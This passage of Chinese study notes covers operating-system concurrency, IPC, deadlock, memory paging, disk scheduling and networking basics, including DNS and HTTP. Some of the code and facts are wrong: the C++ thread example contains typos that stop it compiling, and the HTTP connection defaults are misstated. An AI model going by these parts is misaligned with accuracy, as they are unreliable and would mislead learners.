    (ir->repo_not_empty).notify_all();  //通知消费者产品库不为空。
    lock.unlock();  // 解锁
}

int ConsumeItem(ItemRepository *ir)
{
    int data;
    std::unique_lock<std::mutex> lock(ir->mtx);
    while(ir->write_position == ir->read_position)
    {
        std::cout << "Consumer is waiting for items...\n";
        (ir->repo_not_empty).wait(lock);  // 消费者等待"产品库缓冲区不为空"这一条件发生.
    }
    data = (ir->item_buffer)[ir->read_position];  // 读取某一产品
    (ir->read_position)++;
    if (ir->read_position >= KItemRepositorySize)  
    	ir->read_position = 0;
    (ir->repo_not_full).notify_all();
    lock.unlock();
    return data;
}

void ProduceTask() //生产者任务
{
    for(int i = 1; i <= kItemsToProduce; ++i)
    {
        std::cout << "Produce the " << i << "^th item..." << std::endl;
        ProduceItem(&gItemRepository, i); // 循环生产 kItemsToProduce 个产品.
    }
}
void ConsumerTask() // 消费者任务
{
    static int cnt = 0;
    while(1) {
        sleep(1);
        int item = ConsumeItem(&gItemRepository); // 消费一个产品.
        std::cout << "Consume the " << item << "^th item" << std::endl;
        if (++cnt == kItemsToProduce) break; // 如果产品消费个数为 kItemsToProduce, 则退出.
    }
}
void InitItemRepository(ItemRepository *ir)
{
    ir->write_position = 0; // 初始化产品写入位置.
    ir->read_position = 0; // 初始化产品读取位置.
}

int main()
{
    InitItemRepository(&gItemRepository);
    std::thread producer(ProducerTask); // 创建生产者线程.
    std::tread consumer(ConsumerTask); // 创建消费之线程.
    producer.join();
    consumer.join();
}
```

##### 哲学家进餐问题

五位哲学家围着一张圆桌，每个哲学家前面放着食物。哲学家的活动只有：思考和吃饭。当一个哲学家吃饭时要拿去左右两边的刀叉，并且一次只能拿起一边的物品。

如何防止死锁、且哲学家不会饿死

![img](http://xyongs.cn/image/philosopher-6-11.jpg)

为了防止死锁，可以设置两个条件：

* 必须同时拿起刀叉
* 只有在两个邻居都没有进餐的情况下才允许进餐

##### 读者-写者问题

有读者和写者两组并发进程，共享一个文件，当两个或以上的读进程同时访问共享数据时不会产生副作用，但若某个写进程和其他进程（读进程或写进程）同时访问共享数据时则可能导致数据不一致的错误。

因此要求：

①允许多个读者可以同时对文件执行读操作；

②只允许一个写者往文件中写信息；

③任一写者在完成写操作之前不允许其他读者或写者工作；

④写者执行写操作前，应让已有的读者和写者全部退出。

读进程优先：

```c
int count=0;  //用于记录当前的读者数量
semaphore mutex=1;  //用于保护更新count变量时的互斥
semaphore rw=1;  //用于保证读者和写者互斥地访问文件
writer () {  //写者进程
    while (1){
        P(rw); // 互斥访问共享文件
        Writing;  //写入
        V(rw) ;  //释放共享文件
    }
}

reader () {  // 读者进程
    while(1){
        P (mutex) ;  //互斥访问count变量
        if (count==0)  //当第一个读进程读共享文件时
            P(rw);  //阻止写进程写
        count++;  //读者计数器加1
        V (mutex) ;  //释放互斥变量count
        reading;  //读取
        P (mutex) ;  //互斥访问count变量
        count--; //读者计数器减1
        if (count==0)  //当最后一个读进程读完共享文件
            V(rw) ;  //允许写进程写
        V (mutex) ;  //释放互斥变量 count
    }
}
```

#### 孤儿进程与僵尸进程

[总结](https://www.cnblogs.com/Anker/p/3271773.html)

#### 进程和线程、协程的区别

* 进程：具有一定独立功能的程序关于某个数据集合上的一次运行活动，进程是系统进行资源资源分配和调度的一个独立单位。每个进程都有自己的独立内存空间，不同进程通过进程间通信来通信，所以上下文进程间的切换开销比较大，但相对比较稳定。

* 线程：是一个进程的实体，CPU调度和分派的基本单位，它是比进程更小的能独立运行的基本单位，线程自己基本上不拥有系统资源，只拥有一点在运行中必不可少的资源（程序计数器，一组寄存器和栈），但是它可与同属一个进程的其他的线程共享所有的全部资源。

  线程间通信主要通过共享内存

  上下文切换很快，资源开销较少，但相比进程不稳定，更容易丢失数据

* 协程：是一种用户态的轻量级线程，不被操作系统内核所管理，完全是由用户态控制执行，不会像线程切换那样消耗资源。

#### 进程通信

[Linux进程间通信——使用信号](https://blog.csdn.net/ljianhui/article/details/10128731)

管道、系统IPC（消息队列、信号、共享内存），套接字socket

##### 管道

管道是一种半双工的通信方式，数据只能单向流动，而且只能在具有亲缘关系的进程间使用。进程的亲缘关系通常指父子关系

命名管道FIFO：半双工通信，但允许无亲缘关系的进程间通信

管道必须有父进程，数据是字节流，没有数据结构。

http://c.biancheng.net/view/1213.html

管道是单向的，只允许单向通行，如果需要双向通信，那么就要采取两个管道，而每个管道向不同方向发送数据。

```c++
int pipe(int fd[2]);  // UNIX系统下创建管道函数
```

这个函数创建一个管道，以便通过文件描述符 int fd[] 来访问：fd[0] 为管道的读出端，而 fd[1] 为管道的写入端。UNIX 将管道作为一种特殊类型的文件。因此，访问管道可以采用普通的系统调用 read() 和 write()。

父进程向管道写，而子进程从管道读。重要的是要注意，父进程和子进程开始就关闭了管道的未使用端。

##### 消息队列

是有消息的链表，存放在内核中并由消息队列标识符标识。消息队列克服了信号传递信息少，管道只能承载无格式字节流以及缓冲区大小限制问题

消息队列可以多个不相干的进程来传递数据。而且message作为一个字节序列存储，是一个有意义的结构化。

https://blog.csdn.net/LEON1741/article/details/77934508



##### 共享内存

共享内存就是映射一段能够被其他进程所访问的内存，这段内存由一个进程创建，但多个进程都可以访问。共享内存是最快的IPC方式，它针对的是其他进程间通信方式运行效率低而专门设计的。它往往与其他通信机制，如信号量配合使用，来实现进程间的同步和通信。

由于多个进程共享同一块内存区域，必然需要某种同步机制，互斥锁和信号量都可以。

##### 套接字

用于不同以及其间的进程通信

##### **信号**

信号是一种比较复杂的通信方式，用于通知接收进程某个事件已发生。

系统先定义好的某些特定的事件，可以被发生，也可以被接受。发生和接受的主体都是进程。

3.进程对信号的响应方式：当进程发生时，用户可以要求进程以以下三种方式之一对信号做出响应：
        a.默认信号（SIG_DFL）：按系统默认方式处理，大部分信号的默认操作是终止操作，且所有的实时信号的默认动作都是终止进程。
        b.忽略信号(SIG_IGN)：大多数信号都可以使用这种方式进行处理，但是SIGKILL和SIGSTOP这两个信号不能被忽略，同时这两个信号也不能捕获和阻塞。此外，如果会忽略某些由硬件异常产生的信号（如非法存储访问或除以0），则进程的行为是不可预测的。
        c.自定义信号：对于自定义的信号，可以为其指定信号处理函数，信号发生时该函数自动被调用，在该函数内部实现对信号的处理。

参考  [进程间通信的方式——信号、管道、消息队列、共享内存](https://www.cnblogs.com/LUO77/p/5816326.html)

https://blog.csdn.net/wh_0727/article/details/84074266

#### 线程之间的通信方式

* 锁机制：
  * 互斥锁/量（mutex）：提供了以排他方式防止共享资源被其他线程访问。
  * 读写锁（reader-writer lock）：运行多个线程同时读共享数据，而对写操作是互斥的
  * 自旋锁（spin lock）：与互斥锁类似，都是为了保护共享资源。互斥锁是当资源被占用，申请者进入睡眠状态；而自旋锁则循环检测保持者是否已经释放锁。
    * 自旋锁不会使线程有线程切换，一直处于内核态，这点优于互斥锁。
    * 消耗CPU
    * 使用场景：当大量线程只会短暂的持有锁时，采用自旋锁能够大量减少线程切换。
  * 条件变量（condition）：可以以原子的方式阻塞进程，直到某个特点条件为真为止。对条件变量的使用是在互斥锁的保护下进行的。条件变量始终与互斥锁一起使用。
* 信号机制（signal）：类似进程间信号的处理
* 屏障（barrier）：屏障允许每个线程等待，直到所有的合作线程都达到某一点，然后从该点继续执行。

线程间的通信目的主要是用于线程同步，所以线程没有像进程通信中的用于数据交换的通信机制。

进程之间的通信方式以及优缺点来源于：[进程线程面试题总结](http://blog.csdn.net/wujiafei_njgcxy/article/details/77098977)

##### Linux信号（signal）机制和信号量（semaphore）机制的区别

**Linux信号（signal）机制：**（软中断信号）用来通知进程发生的异步事件

**原理：**

一个进程收到一个信号与处理器收到一个中断请求可以说是一样的。信号是进程间通信机制中唯一的异步通信机制，一个进程不必通过任何操作来等待信号的到来，事实上，进程也不知道信号到底什么时候达到。进程之间可以互相通过系统调用kill发送软中断信号。内核也可以因为内部事件而给进程发送信号，通知进程发生了某个事件。信号机制除了基本通知功能外，还可以传递附件信息。

**信号量（semaphore）机制**：Linux内核的信号量用来操作系统进程间同步访问共享资源。

**原理：**

信号量在创建时需要设置一个初始值，表示同时可以有几个任务可以访问该信号量保护的共享资源，初始值为1就变成互斥锁，即同时只有一个任务可以访问信号量保护的共享资源。

#### 死锁

##### 死锁的必要条件

* 互斥：每个资源要么已经分配给了一个进程，要么就是可用的
* 占有和等待：已经得到了某个资源的进程可以再请求新的资源
* 不可抢占：已经分配给一个进程的资源不能强制性地被抢占，它只能被占有它的进程显式地释放。
* 环路等待：有两个或以上的进程组成一条环路，该环路中的每个进程都在等待下一个进程所占有的资源

##### 死锁的预防

* 打破互斥条件：改造独占资源为虚拟资源
* 打破不可抢占条件：当一进程占有一独占性资源后有又申请其他独占资源未得到满足时，则退出原占有的资源
* 打破占有且申请条件：采用资源预先分配策略，即进程运行前申请全部资源，满足则运行，不然就等待，这样就不会占有且申请
* 打破循环等待条件：实现资源有序分配，对所以的设备编码，所有进程只能采用按序号递增的形式申请资源
* 有序资源分配法
* 银行家算法

#### 银行家算法

参考[死锁 & 银行家算法](https://www.jianshu.com/p/355f138ea3c8)

银行家算法是仿照银行发放贷款时采用的控制方式而设计的一种死锁避免地算法，该算法的策略是实现**动态避免死锁**

算法思想：分配资源之前，判断系统是否安全，如果安全才会进行资源分配

**实例**

系统中有R1,R2,R3三种资源，在time0时刻，5个线程T0,T1,T2,T3,T4对资源的占用和需求如下表，此时系统可用资源向量为（3,3,2）。求time0时刻是否存在安全序列？

| thread | sum_need | allocated | needing | available |
| ------ | -------- | --------- | ------- | --------- |
| T0     | (7,5,3)  | (0,1,0)   | (7,4,3) | (3,3,2)   |
| T1     | (3,2,2)  | (2,0,0)   | (1,2,2) |           |
| T2     | (9,0,2)  | (3,0,2)   | (6,0,0) |           |
| T3     | (2,2,2)  | (2,1,1)   | (0,1,1) |           |
| T4     | (4,3,3)  | (0,0,2)   | (4,3,1) |           |

1、在time0时刻，available(3,3,2) > T1.needing(1,2,2)； 所以T1可以执行，T1执行完毕之后available = T1.allocated(2,0,0) + available(3,3,2) = (5,3,2);

| thread | sum_need | allocated | needing | available |
| ------ | -------- | --------- | ------- | --------- |
| T0     | (7,5,3)  | (0,1,0)   | (7,4,3) | (5,3,2)   |
| T2     | (9,0,2)  | (3,0,2)   | (6,0,0) |           |
| T3     | (2,2,2)  | (2,1,1)   | (0,1,1) |           |
| T4     | (4,3,3)  | (0,0,2)   | (4,3,1) |           |

2、进入time1时刻，available(5,3,2) > T3.needing(0,1,1)；所以T3可以执行，T3执行完毕之后available = T3.allocated(2,1,1)+available(5,3,2) = (7,4,3)；

| thread | sum_need | allocated | needing | available |
| ------ | -------- | --------- | ------- | --------- |
| T0     | (7,5,3)  | (0,1,0)   | (7,4,3) | (7,4,3)   |
| T2     | (9,0,2)  | (3,0,2)   | (6,0,0) |           |
| T4     | (4,3,3)  | (0,0,2)   | (4,3,1) |           |

3、进入time2时刻，available(7,4,3) > T4.needing(4,3,1)；所以T4可以执行，T4执行完毕之后available = T4.allocated(0,0,2) + available(7,4,3) = (7,4,5)；

| thread | sum_need | allocated | needing | available |
| ------ | -------- | --------- | ------- | --------- |
| T0     | (7,5,3)  | (0,1,0)   | (7,4,3) | (7,4,5)   |
| T2     | (9,0,2)  | (3,0,2)   | (6,0,0) |           |

4、进入time3时刻，available(7,4,5) > T2.needing(6,0,0)；所以T2可以执行，T2指向完毕之后available = T2.allocated(3,0,2) + available(7,4,5) = (10,4,7)；

| thread | sum_need | allocated | needing | available |
| ------ | -------- | --------- | ------- | --------- |
| T0     | (7,5,3)  | (0,1,0)   | (7,4,3) | (10,4,7)  |

5、进入time4时刻，因为available(10,4,7) > T0.needing(7,4,3)；所以执行T0。完成安全序列.

#### 用户线程和内核线程的区别

1. 内核线程：切换由内核控制，当线程进行切换的时候，由用户态转化为内核态。切换完毕后要从内核态返回用户态；

   > 优点：当有多个处理机时，一个进程的多个线程可以同时执行
   >
   > 缺点：由内核进行调度。

2. 用户线程，线程的切换由用户自己控制，不需要内核的干涉，少了进程内核态的消耗，但是不能很好的利用多核CPU；

   > 线程表在用户态中
   >
   > 优点：
   >
   > 1. 线程的调度不需要内核的之间参与，启动比内核调用效率高，不需要陷入内核，不需要上下文切换
   >
   > 2. 允许每个进程有自己定制的调度算法，如某些应用程序中垃圾回收线程
   >
   > 缺点：在多处理机下，同一个进程中的线程只能在一个处理机下分时复用

### 提高计算机的并发能力

[提高计算机的并发能力](https://my.oschina.net/javaroad/blog/4382771)

### 🏷 内存管理

#### 分页和分段存储管理有和区别？

1. 页是信息的物理单位，分页是为了实现离散分配方式，以消减内存的外零头，提高内存的利用率。段则是信息的逻辑单位，它含有一组其意义相对完整的信息。分段的目的是为了更好的满足用户的需要。
2. 页的大小是固定且有系统决定；而段的长度却不固定，决定于用户所编写的程序。
3. 分页的地址空间是一维的，程序员只需要利用一个记忆符号，即可表示一个地址；而分段的作也地址空间是二维的，程序员在标识一个地址时，既需要给出段名，有需要给出段内地址。

#### 地址空间

地址空间：物理地址空间，逻辑地址空间

 逻辑地址空间 -- 程序-汇编-链接--

物理地址空间的生成：内存的逻辑地址空间会有一个到物理地址的映射

连续内存的分配

**内存碎片问题：**

1）外部碎片，指的是还没有分配除去，但是由于太小无法分配

2）内部碎片，已经分配出去但是不能被利用

**内存分配算法：**（1）首次适配 （2）最优适配 （3）最差适配

（1）首次适配：按地址排序的空间列表，容易产生外部碎片

（2）最优适配算法：选择差值最小的空闲块，容易产生很多没使用的微小碎片。

（3） 最差分配算法，选择差值最大的空闲块，破碎了大块的空闲块以至于无法被分配

**进一步处理使得内存碎片消失的办法**

（1）压缩碎片整理：重置所有程序以合并空块，要求所有的程序是动态可以重置的，缺陷：重复拷贝，内存开销比较大

（2）交换式碎片整理：抢占等待的程序

**内存非连续分配管理方式：**https://www.cnblogs.com/felixfang/p/3420462.html

#### 分页

*把主存空间划分为大小相等且固定的块，块相对较小，作为主存的基本单位*。每个进程也以块为单位进行划分，进程在执行时，以块为单位逐个申请主存中的块空间。

**分页存储管理的逻辑地址结构如图所示：**

![img](http://xyongs.cn/image/memory1.png)

地址结构包含两部分：前一部分为页号P，后一部分为页内偏移量W。地址长度为32 位，其中011位为页内地址，即每页大小为4KB；1231位为页号，地址空间最多允许有2^20(1M)页。

1.3 页表

为了便于在内存中找到进程的每个页面所对应的物理块，**系统为每个进程建立一张页表**，记录页面在内存中对应的物理块号，页表一般存放在内存中。

进程通过查表得到每页在内存中的物理块号。由页表实现了从页号到物理块号的地址映射。如下图所示：

![img](http://xyongs.cn/image/memory2.png)

4 两级和多级页表

现代大多数计算机系统都支持非常大的逻辑地址空间（232~264），在这样的环境下，页表就变得非常大，要占很大的内存空间。32 位逻辑地址空间、页面大小4KB、页表项大小4B为例，若要实现进程对全部逻辑地址空间的映射，则每个进程需要2^20个页表项。也就是说，每个进程仅页表这一项就需要4MB主存空间，这显然是不切实际的。

此问题解决分两方面：一方面，只将当前需要的部分表项调入内存，其余的页表仍然驻留在磁盘上，需要时再调入。另一方面，需要对页表映射的思想进一步延伸，就可以得到二级分页。

分页管理方式是从计算机的角度考虑设计的，以提高内存的利用率，提升计算机的性能, 且分页通过硬件机制实现，对用户完全透明；

而分段管理方式的提出则是考虑了用户和程序员，以满足方便编程、信息保护和共享、动态增长及动态链接等多方面的需要。

#### 分段

段式管理方式按照用户进程中的自然段划分逻辑空间。例如，用户进程由主程序、两个子程序、栈和一段数据组成，于是可以把这个用户进程划分为5个段，每段从0 开始编址，并分配一段连续的地址空间（**段内要求连续，段间不要求连续，因此整个作业的地址空间是二维的**）。其逻辑地址由段号S与段内偏移量W两部分组成。

2 段表

*每个进程都有一张逻辑空间与内存空间映射的段表*，其中每一个段表项对应进程的一个段，段表项记录该段在内存中的起始地址和段的长度。

**段页式管理方式**

页式存储管理能有效地提高内存利用率，而分段存储管理能反映程序的逻辑结构并有利于段的共享。如果将这两种存储管理方法结合起来，就形成了段页式存储管理方式。

在段页式系统中，作业的地址空间首先被分成若干个逻辑段，每段都有自己的段号，然后再将每一段分成若干个大小固定的页。对内存空间的管理仍然和分页存储管理一样，将其分成若干个和页面大小相同的存储块，对内存的分配以存储块为单位，

链接：https://www.jianshu.com/p/7bfe9bb44c07

#### 页面置换算法

在程序运行过程中，如果要访问的页面不在内存中，就发生缺页中断从而将该页面调入内存中。此时如果内存已无空闲空间，系统必须从内存中调出一个页面到磁盘中对换区中腾出的空间。

页面置换算法和缓存淘汰策略类似，可以将内存看成磁盘的缓存。在缓存系统中，缓存的大小有限，当有新的缓存到达时，需要淘汰一部分已经存在的缓存，这样才有空间存放新的缓存数据。

##### 最佳适配算法

OPT，Optimal replacement algorithm

所选择的被替换出的页面将是最长时间内不再被访问，通常可以保证获得最低的缺页率。

这是一种理论上的算法，因为无法知道一个页面多长时间不再被访问。

> 例如：一个系统为某个进程分配了三个物理块，如有如下页面引用序列：
>
> ```
> 7，0，1，2，0，3，0，4，2，3，0，3，2，1，2，0，1，7，0，1
> ```
>
> 开始运行时，先将 7, 0, 1 三个页面装入内存。当进程要访问页面 2 时，产生缺页中断，会将页面 7 换出，因为页面 7 再次被访问的时间最长。

##### 最近最久未使用

LRU， Least Recently used

虽然无法知道将来要使用的页面情况，但是可以知道过去使用页面的情况。LRU 将最近最久未使用的页面换出。

为了实现 LRU，需要在内存中维护一个所有页面的链表。当一个页面被访问时，将这个页面移到链表表头。这样就能保证链表表尾的页面是最近最久未访问的。

因为每次访问都需要更新链表，因此这种方式实现的 LRU 代价很高。

```
4，7，0，7，1，0，1，2，1，2，6
```

![img](http://xyongs.cn/image/LRU-6-11.png)

##### 最近最少使用

LFU， Least Frequently Used

它是基于“如果一个数据在一段时间内很少次数被使用，那么在将来的一段时间内被使用的可能性也很小”的思路。

##### 先进先出

FIFP，First In First Out 

选择换出的页面是最先进入的页面。

该算法会将那些经常被访问的页面换出，导致缺页率升高。

### 🏷 设备管理

来自 ：[设备管理](https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86.md)

#### 磁盘结构

* 盘面（Platter）：一个磁盘有多个盘面
* 磁道（Track）：盘面上的圆形带状区，一个盘面可以有多个磁道
* 扇区（Track Sector）：磁道上的一个弧段，一个磁道可以有多个扇区，它是最小的物理存储单位，目前主要有512bytes和4k两种大小
* 磁头（Head）：与盘面非常接近，能将盘面上的磁场转换为电信号（读），或将电信号转换为盘面的磁场（写）
* 制动手臂（Actuator Arm）：用于在磁道之间移动磁头；
* 主轴（Spindle）：使磁盘转动

![img](http://xyongs.cn/image/SSD-6-11.jpg)

读写一个磁盘块的时间的影响因素有：

- 旋转时间（主轴转动盘面，使得磁头移动到适当的扇区上）
- 寻道时间（制动手臂移动，使得磁头移动到适当的磁道上）
- 实际的数据传输时间

其中，寻道时间最长，因此磁盘调度的主要目标是使磁盘的平均寻道时间最短。

##### 1. 先来先服务

> FCFS, First Come First Served

按照磁盘请求的顺序进行调度。

优点是公平和简单。缺点也很明显，因为未对寻道做任何优化，使平均寻道时间可能较长。

##### 2. 最短寻道时间优先

> SSTF, Shortest Seek Time First

优先调度与当前磁头所在磁道距离最近的磁道。

虽然平均寻道时间比较低，但是不够公平。如果新到达的磁道请求总是比一个在等待的磁道请求近，那么在等待的磁道请求会一直等待下去，也就是出现饥饿现象。具体来说，两端的磁道请求更容易出现饥饿现象。

![img](http://xyongs.cn/image/SSTF-6-11.png)

##### 3. 电梯算法

> SCAN

电梯总是保持一个方向运行，直到该方向没有请求为止，然后改变运行方向。

电梯算法（扫描算法）和电梯的运行过程类似，总是按一个方向来进行磁盘调度，直到该方向上没有未完成的磁盘请求，然后改变方向。

因为考虑了移动方向，因此所有的磁盘请求都会被满足，解决了 SSTF 的饥饿问题。

![img](http://xyongs.cn/image/SCAN-6-11.png)

## 📚 计算机网络

**参考**

《计算机自顶向下》

https://blog.csdn.net/ThinkWon/article/details/104903925

**❓网络协议是什么？**

在计算机网络中要做到有条不紊的交换数据，就必须遵守一些事先约定好的规则，比如交换数据的格式，是否需要发送一个应答消息。这些规则被称为网络协议。

### 🏷 网络协议分层

**四层网络结构和其上协议**

| 层         | 协议                          | 设备                                             |
| ---------- | ----------------------------- | ------------------------------------------------ |
| 应用层     | 用户进程                      | 软件                                             |
| 传输层     | TCP    UDP                    | 网关                                             |
| 网络层     | ICMP    IP   IGMP             | 路由器，三层交换机，hub                          |
| 数据链路层 | ARP    以太网接口程序    RARP | 物理层：中继器、集线器；数据链路层：交换器、网桥 |

**ICMP(报文控制协议)：**

> 确认IP包是否成功到达目的地址，通知在发送过程中IP包被丢弃的原因
>
> **ping程序**：采用的就是该协议，测试一台主机是否可到达；该程序发送ICMP回显请求报文给主机等待主机回复ICMP回复报文

IGMP(互联网组管理协议)

> 是TCP/IP协议族中负责IP组播成员管理的协议，用来在IP主机和其直接相邻的组播路由器之间建立、维护组播成员关系。
>
> 目的：IP组播通信的特点是报文从一个源出发到一组特定的接受者。但在组播通信模型中，发送者不再关注接收者的位置信息，只是将数据发送到约定的目的组播地址。要使组播报文中最终能够到达接受者，需要某种机制使链接接受者网段的组播路由器能够了解到该网段存在哪些组播协议者，同时保证接受者可以加入相应的组播组中。IGMP协议就是用来在接受者主机与其所在网段直接相邻的组播路由器建立、维护组播成员关系的协议
>
> 工作机制：
>
> 1. 接受者主机向所在的共享网络报告组成员关系
> 2. 处于同一网段的所有使用了IGMP功能的组播路由器选举出一台作为查询器，查询器周期性向该共享网段发送组成员查询消息；
> 3. 接受者主机接收到该查询消息后进行应答以报告成员关系
> 4. 网段中的组播路由器依次根据接收的应答来刷新组成员的存在信息。如果超时无响应，组播路由器就认为网段中没有该组播的成员，从而取消相应的组播数据转发。
> 5. 所以参与组播传输的接受者主机必须应用IGMP协议，主机可以在任何时间、任何位置、成员数不受限制得加入或退出组播组
> 6. 支持组播的路由器不需要也不可能保存所有的主机成员关系，它只需通过IGMP协议了解每个接口连接的网段上是否存在某个组播接收者，即组成员。而各主机只需要保存自己加入了哪些组播组
>
> IGMPv1工作原理:
>
> 两种类型的报文：
>
> * 普通组查询报文：查询器向共享网络上所有主机和路由器发送的查询报文，用于了解哪些组播组存在成员。
>
> * 成员报告报文：主机向查询器发送的报告报文，用于申请加入某个组播或者应答查询报文。

**ARP（地址解析协议）：**

> 将32为的IP地址转为48位以太网地址
>
> 工作原理：每台主机都会在自己的ARP缓冲区中建立一个ARP列表，以表示IP地址与MAC地址的对于关系。当源主机需要将一个数据包发送到目的主机时，会首先检测自己的ARP表，是否有对于的值，如果有就直接将数据包发送到这个MAC地址；如果没有执行以下过程
>
> 过程：
>
> 1、ARP请求，当主机需要找出网络中的另一个主机的物理地址时，他会发送一个ARP报文，这个报文包好了发送方的MAC地址和IP地址以及接收方的IP地址。因为发送方不知道接收方的物理地址，所以这个查询分组会在网络层中进行广播。
>
> 2、ARP响应
>
> 局域网中的每一台主机都会接受并处理这个ARP请求报文，然后进行验证，查看接收方的IP地址是不是自己的地址，只有验证成功的主机才会返回一个ARP响应报文，这个响应报文包含接收方的IP地址和物理地址。这个报文利用收到的ARP请求报文中的请求方物理地址以单播的方式直接发送给ARP请求报文的请求方。

**RARP（逆地址解析协议）**

> 如主机只知道自己的物理地址，而不知道IP地址，发送RARP协议包到--->RARP服务器---->返回响应包
>
> RARP的工作过程如下：
>
> 1. 网络上每台设备都会有一个独一无二的硬件地址，一般是由设备厂商分配的MAC地址。发送主机从网卡上读取MAC地址，然后在网络上发送一个RARP请求的广播数据包，请求任何收到此请求的RARP服务器分配一个IP地址；
> 2. RARP服务器收到此请求后，检查其RARP表项，查找该MAC地址对应的IP地址；
> 3. 如果存在，RARP服务器就给发送主机回复一个响应数据包，并将此IP地址提供给对方主机使用；
> 4. 如果不存在，RARP服务器对此不做任何的响应；
> 5. 发送主机收到从RARP服务器的响应信息，就利用得到的IP地址进行通讯，如果一直没有收到RARP服务器的响应消息，表示初始化失败。

--------------------------------

❓**为什么要对网络协议进行分层？**

* 简化问题难道和复杂度。由与各层之间独立，可以分割大问题为小问题
* 灵活性好。当其中一层的技术变化时，只需要层间接口关系保持不变，其他层不受影响
* 易于实现和维护
* 促进标准化工作。

网络协议分层的缺点：功能可能出现在多个层里，产生额外的开销

分层：

![img](http://xyongs.cn/image/network_pro_530.png)

**OSI七层模型及其包含的协议**

| 层         | 作用                               | 协议           |
| ---------- | ---------------------------------- | -------------- |
| 应用层     | 允许访问OSI环境的手段              | FTP，HTTP，DNS |
| 表示层     | 对数据进行翻译、加密、压缩         | JPEG，ASII     |
| 会话层     | 建立、管理和终止会话               | RPC，NFS       |
| 传输层     | 提供端到端的数据传输               | TCP，UDP       |
| 网络层     | 负责数据包从源到宿的传递和网际交互 | IP，ICMP，IGMP |
| 数据链路层 | 将比特组装成帧和点到点传输         | MAC，VLAN，PPP |
| 物理层     | 通过媒介传输比特                   | IEEE802.3      |

### 🏷 应用层

应用层的任务是通过应用进程间的交互来完成特点的网络应用。应用层协议定义的是应用进程间的通信和交互的规则。

对于不同的网络应用需要不同的应用层协议。在互联网中应用层协议很多，如域名系统DNS，HTTP，SMTP

#### DNS解析

DNS基于UDP服务，端口53。HTTP，SMTP等在其中需要完成主机名到IP地址的转换

**递归查询与迭代查询**

**递归查询：**是DNS服务器的查询模式，该模式下DNS服务器接收到客户机请求，必须使用一个准确地查询结果回复客户机。如果DNS服务器没有存储DNS信息，那么该服务器会询问其他的服务器，并将返回的查询结果提交给客户机。

![img](http://xyongs.cn/image/network_DNS_1_530.png)

**迭代查询**

DNS服务器会向客户机提供其他能够解析查询请求的DNS服务器地址。当客户机发送查询请求时，DNS服务器不直接回复查询结果，而是告诉客户机另一台DNS的服务器地址，客服机在向这台DNS服务器提交请求，循环此操作。

![img](http://xyongs.cn/image/network_DNS_2_530.png)

**DNS劫持**

DNS劫持就是通过劫持了DNS服务器，通过某些手段取得某域名的解析记录控制权，进而修改此域名的解析结果，导致对该域名的访问由原IP地址转入到修改后的指定IP，其结果就是对特定的网址不能访问或访问的是假网址，从而实现窃取资料或者破坏原有正常服务的目的。DNS劫持通过篡改DNS服务器上的数据返回给用户一个错误的查询结果来实现的。

**DNS污染**

DNS污染是一种让一般用户由于得到虚假目标主机IP而不能与其通信的方法，是一种DNS缓存投毒攻击（DNS cache poisoning）。

其工作方式是：由于通常的DNS查询没有任何认证机制，而且DNS查询通常基于的UDP是无连接不可靠的协议，因此DNS的查询非常容易被篡改，通过对UDP端口53上的DNS查询进行入侵检测，一经发现与关键词相匹配的请求则立即伪装成目标域名的解析服务器（NS，Name Server）给查询者返回虚假结果。

DNS污染发生在用户请求的第一步上，直接从协议上对用户的DNS请求进行干扰。

DNS污染症状：目前一些被禁止访问的网站很多就是通过DNS污染来实现的，例如YouTube、Facebook等网站。

**解决办法**：

对于DNS污染，可以说，个人用户很难单单靠设置解决，通常可以使用VPN或者域名远程解析的方法解决，但这大多需要购买付费的VPN或SSH等，也可以通过修改Hosts的方法，手动设置域名正确的IP地址。

#### HTTP

参考：https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/HTTP.md

##### HTTP工作流程

![img](http://xyongs.cn/image/HTTP-work-6-4.png)

##### 基本概念：

URI（uniform Resource Indentifier): 统一资源标识符

> 其中包含：
>
> URL统一资源定位符：https://www.google.com
>
> URN 统一资源名称

请求报文和响应报文：

都是有报头和报文体组成，中间以空行隔开

1. 请求报文

![img](http://xyongs.cn/image/HTTP-req-6-4.png)

2. 响应报文

![img](http://xyongs.cn/image/HTTP-res-6-4.png)

##### HTTP 常用方法

| 方法    | 作用                       | 备注                                                         |
| ------- | -------------------------- | ------------------------------------------------------------ |
| GET     | 获取资源                   | 当前网络请求中，大多使用GET方法                              |
| HEAD    | 获取报文首部               | 和GET方法类似，但不返回报文实体主体部分<br />主要用于确认URL的有效性及资源更新时间 |
| POST    | 传输实体主体               | 传输数据                                                     |
| PUT     | 上传文件                   | 由于不带验证机制，任何人都可上传文件，一般不使用             |
| DELETE  | 删除                       | 与PUT功能相反，不带验证机制                                  |
| OPTIONS | 查询支持的方法             | 查询指定URL能够支持的方法<br />返回：`Allow: GET, POST, HEAD`等内容 |
| CONNECT | 与代理服务器通信时建立隧道 |                                                              |

##### HTTP返回码

| 状态码 | 类别         | 含义                       | 实例                                                         |
| ------ | ------------ | -------------------------- | ------------------------------------------------------------ |
| 1XX    | 信息性状态码 | 接收的请求正在处理         |                                                              |
| 2XX    | 成功状态码   | 请求正常处理完毕           | 200 OK：客户端请求成功<br />201：服务器接收到请求，稍后会处理<br />206 partial content：服务器正确处理部分GET请求 |
| 3XX    | 重定向状态码 | 需要进行附加操作以完成请求 | 301（永久重定向）<br />302（临时重定向）                     |
| 4XX    | 客户端错误   | 客户端错误                 | 401：客户端试图访问一个受保护的资源<br />403：禁止访问<br />404：访问资源不存在 |
| 5XX    | 服务器端错误 | 服务器错误                 | 500：服务器响应错误<br />502：网关错误                       |

##### 长连接与短连接

当浏览器访问一个包含多张图片的HTML页面时，除了请求访问的HTML资源，还会请求图片资源。如果每次进行一次TCP通信就要新建一个TCP连接，那么开销会很大。

长连接只需建立一次TCP连接就可以进行多次HTTP通信。

* 从HTTP/1.1开始默认是长连接的，如果要断开连接，需要由客户端或服务器端提出断开，使用`connection:close`
* 在HTTP/1.1之后默认使用的是短连接，如果需要使用长连接，则使用`Connection:Keep-Alive`。

##### 流水线

默认情况下，HTTP请求是按顺序发出的，下一个请求只有在当前请求收到响应之后才会被发出。由于受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间

流水线就是在同一条长连接上连续发送请求，而不用等待响应返回，这样就可以减少延迟

##### cookie与session

